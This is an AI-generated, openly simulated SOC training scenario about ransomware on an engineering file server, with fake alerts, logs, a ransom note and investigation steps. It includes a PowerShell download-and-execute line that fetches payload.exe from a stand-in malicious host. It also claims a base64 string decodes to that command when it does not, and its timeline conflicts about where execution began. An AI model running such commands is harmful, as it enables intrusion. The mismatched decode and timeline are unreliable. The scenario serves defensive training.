---
Owner: Chris Adams
title: Ransomware Attack on an Engineering File Server
type: Simulated Scenario
topic: ransomware
summary: Users are noticing important files with a .crypted extension. Review to see the investigation process.
date: 2024-11-12
tags:
  - ai-generated
  - cybersecurity/ransomware
  - security-engineer/active-directory
  - cybersecurity/threat-hunting
  - ai-generated/cyber-scenarios
publish: 
goal: Investigate the alerts to determine root cause and escalation steps to incident response.
---
> [!Important] Important!
> This is a fake scenario generated by AI and is meant solely for educational purposes. 
### **Scenario: Ransomware Attack on an Engineering File Server**

#### **Background:**
It’s a busy Wednesday afternoon in the SOC. The Help Desk starts receiving complaints from the engineering department that they can't access important project files on the main file server, `ENG-FS01`. Upon trying to open the files, users find that all documents have a new `.crypted` extension. A ransom note file, `!README_DECRYPT!.txt`, appears in each directory, instructing users to pay a ransom in cryptocurrency to retrieve their files.

#### **Alert Summary:**
Your SIEM triggered the following alerts:

| Alert                                                                 | Type                           | Source                                | Destination                                               | Description                                                                              |
| --------------------------------------------------------------------- | ------------------------------ | ------------------------------------- | --------------------------------------------------------- | ---------------------------------------------------------------------------------------- |
| **Suspicious File Modification on ENG-FS01**                          | Endpoint Detection Alert       | `ENG-FS01`                            |                                                           | High rate of file renaming and modification, with `.crypted` extension applied to files. |
| **Unusual Network Activity from a Non-Admin Workstation (ENG-WKS12)** | Network Behavior Anomaly Alert | `ENG-WKS12`                           | `ENG-FS01`                                                | High volume of SMB traffic detected between `ENG-WKS12` and `ENG-FS01`.                  |
| **Unauthorized Process Execution on ENG-FS01**                        | Process Monitoring Alert       | `ENG-FS01`                            | `cmd.exe /c powershell.exe -enc (base64-encoded command)` | PowerShell command executed with encoded payload under the “Engineering” user account.   |
| **Login Failure Alert for Multiple Workstations**                     | Authentication Alert           | `ENG-WKS12`, `ENG-WKS15`, `ENG-WKS17` |                                                           | Multiple failed login attempts from “Engineering” user on unrelated workstations.        |

<div class="neon-line"></div>

### **Objective:**
Investigate the origin of the ransomware attack, analyze the scope of the infection, and initiate containment and remediation actions.

<div class="neon-line"></div>
### **Fake Telemetry Details and Logs**

#### **Alert 1: Suspicious File Modification on ENG-FS01**

**Telemetry Data (File Modifications):**
- High frequency of renaming observed in directories: `\\ENG-FS01\Projects\`, `\\ENG-FS01\Designs\`
- Common filename pattern: original document names now end with `.crypted` extension
- Files affected: `project_plan.docx`, `design_specs.xlsx`, `budget_report.pdf`

**Sample Ransom Note (From !README_DECRYPT!.txt):**
```
All your files have been encrypted with strong encryption!
To restore access, you must pay a ransom of 2 BTC to the following address: 1FakeBitcoinAddressHere

If you do not pay within 72 hours, your data will be permanently lost.
```

<div class="neon-line"></div>

#### **Alert 2: Unusual Network Activity from ENG-WKS12**

**Telemetry Data (SMB Traffic):**
- High volume of SMB file write operations from `ENG-WKS12` to `ENG-FS01`
- Connection timeline:
  - 12:30 PM - Connection established from `ENG-WKS12` to `ENG-FS01`
  - 12:32 PM - Sudden increase in file write operations
  - 1:00 PM - SMB session terminated

<div class="neon-line"></div>

#### **Alert 3: Unauthorized Process Execution on ENG-FS01**

**Telemetry Data (Process Execution on ENG-FS01):**
- Process Name: `cmd.exe`
- Command Line:
  ```shell
  cmd.exe /c powershell.exe -enc dGhpcyBpcyBhIHNpbXVsYXRlZCBleGFtcGxlIGZvciBiYXNlNjQgZGVjb2Rpbmc=
  ```
  - Decodes to: `powershell.exe -Command "Invoke-WebRequest -Uri http://malicious-server.com/downloads/payload.exe -OutFile C:\Windows\Temp\payload.exe"`
- Execution timeline:
  - 12:25 PM - Command executed by user `Engineering`
  - 12:27 PM - `payload.exe` created in `C:\Windows\Temp\`
  - 12:28 PM - `payload.exe` executed and initiated file modifications

<div class="neon-line"></div>

#### **Alert 4: Login Failure Alert for Multiple Workstations**

**Telemetry Data (Authentication Attempts):**
- Failed login attempts:
  - Source: `ENG-WKS12`
  - Targets: `ENG-WKS15`, `ENG-WKS17`, `ENG-WKS20`
- Frequency:
  - 12:35 PM - 20 failed login attempts over SMB protocol, targeting unrelated engineering workstations
- Account used: `Engineering`

<div class="neon-line"></div>

### **Investigation Steps**

Here’s a guided investigation flow to analyze the scenario in-depth.
#### **Step 1: Decode the Base64 PowerShell Command**
- The encoded PowerShell command was identified as:
  ```shell
  dGhpcyBpcyBhIHNpbXVsYXRlZCBleGFtcGxlIGZvciBiYXNlNjQgZGVjb2Rpbmc=
  ```

- **Decode** the command using a decoding tool to reveal:

  ```shell
  powershell.exe -Command "Invoke-WebRequest -Uri http://malicious-server.com/downloads/payload.exe -OutFile C:\Windows\Temp\payload.exe"
  ```

- **Analysis:** This command indicates an attempt to download a malicious payload from an external server. This file likely initiated the ransomware encryption process on `ENG-FS01`.

#### **Step 2: Trace the Infection Source from ENG-WKS12**

- **Check Process Creation Logs on ENG-WKS12:**
  - Look for the initial download and execution of the `payload.exe` file.
  - Confirm if there are any logins or administrative actions taken by `ENG-WKS12` that could have propagated the attack to `ENG-FS01`.

- **Analyze SMB Traffic:**
  - The SMB traffic from `ENG-WKS12` to `ENG-FS01` indicates unauthorized file modifications, likely involving the encryption process.
  - Identify if the ransomware used file shares to spread.

#### **Step 3: Review Authentication Failures Across Engineering Workstations**

- The failed login attempts from `ENG-WKS12` to other workstations suggest possible lateral movement.
- **Action:** Investigate if the user credentials on `ENG-WKS12` were compromised, especially the “Engineering” account. This account may have been used to access multiple workstations, attempting to spread the infection.

#### **Step 4: Identify Scope and Contain the Infection**

- **Determine the Impact on ENG-FS01:**
  - Assess the number of files affected and ensure backups are available.
  - **Isolate** `ENG-WKS12` and `ENG-FS01` to prevent further spread.
  - **Block** connections to `malicious-server.com` at the firewall level to prevent additional payload downloads.

- **Quarantine ENG-WKS12:**
  - Block all network access from `ENG-WKS12` to limit potential lateral movement or further malware propagation.
  - Begin scanning the endpoint for any additional malware or residual infections.

#### **Step 5: Coordinate with Incident Response Team**

- **Contact IT and Recovery Teams:**
  - Notify them of the ransomware’s extent and request file recovery from the most recent backups.
  - Begin discussions on password resets for affected accounts to prevent re-infection.

- **Draft an Internal Advisory for Engineering Staff:**
  - Communicate the issue and advise on security hygiene, particularly around phishing and suspicious emails.

<div class="neon-line"></div>

### **Key Actions and Recommendations**

1. **Immediate Actions:**
   - Block external access to the malicious domain (`malicious-server.com`) and isolate affected systems (`ENG-WKS12` and `ENG-FS01`).
   - Initiate malware scans and verify if any other systems have interacted with the malicious server.

2. **Remediation and Follow-Up:**
   - Restore encrypted files from backups if available.
   - Perform a full password reset for users in the engineering department to prevent re-entry by attackers.
   - Conduct a post-incident analysis to identify how the malicious PowerShell script initially executed on `ENG-WKS12`.

3. **Long-Term Security Enhancements:**
   - Implement stricter SMB traffic monitoring and logging.
   - Enforce PowerShell logging and audit logs on critical servers to detect unusual commands or encoded payloads.
   - Improve user training to recognize suspicious activity and report potential phishing.

<div class="neon-line"></div>

This scenario is designed to mimic the rapid-response, multi-step investigation process MDR analysts handle in ransomware and lateral movement incidents, testing both technical skills and strategic decision-making.

#### Created on: Nov 12, 2024
---
<div style="text-align: center;">
	<div class="gradient-text">👾 2024 rabb1th0les (Chris A)dams 👾</div> 
	🌴☀Thanks for supporting my page ☀🌴
	<nav>
		<ul style="list-style: none; padding: 0;">
			<div style="text-align: center;">
				<li><a href="index.html">Home</a> | <a href="Contact.html">Contact</a></li>
			</div>
		</ul>
	</nav>	
</div>